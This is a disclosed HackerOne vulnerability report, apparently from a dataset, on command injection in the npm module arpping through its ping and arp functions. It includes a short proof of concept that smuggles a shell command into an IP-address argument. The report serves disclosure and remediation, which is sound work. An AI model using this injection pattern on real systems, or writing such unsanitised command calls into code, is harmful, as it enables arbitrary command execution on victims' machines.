---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '972220'
original_report_id: '972220'
title: '[arpping] Remote Code Execution'
weakness: Code Injection
team_handle: nodejs-ecosystem
created_at: '2020-09-01T14:34:13.748Z'
disclosed_at: '2021-01-14T08:39:29.702Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- code-injection
---

# [arpping] Remote Code Execution

## Metadata

- HackerOne Report ID: 972220
- Weakness: Code Injection
- Program: nodejs-ecosystem
- Disclosed At: 2021-01-14T08:39:29.702Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report `RCE` in `arpping`
It allows to execute arbitrary commands on the victim's PC

# Module

**module name:** arpping
**version:** 2.0.0
**npm page:** `https://www.npmjs.com/package/arpping`

## Module Description

Discover and search for internet-connected devices (locally) using ping and arp

## Module Stats

[16] weekly downloads

# Vulnerability

## Vulnerability Description

Code injection occurs when using commands: `ping`, `arp`

## Steps To Reproduce:

- Create and run the following POC index.js:

```javascript
const Arpping = require('arpping');

var arpping = new Arpping();
arpping.ping(["127.0.0.1;touch HACKED;"]); // arpping.arp(["127.0.0.1; touch HACKED;"]);
```
- The exploit worked and created the file - `HACKED`

{F972163}

## Patch

Check input before command

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `arpping` module via insecure command

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
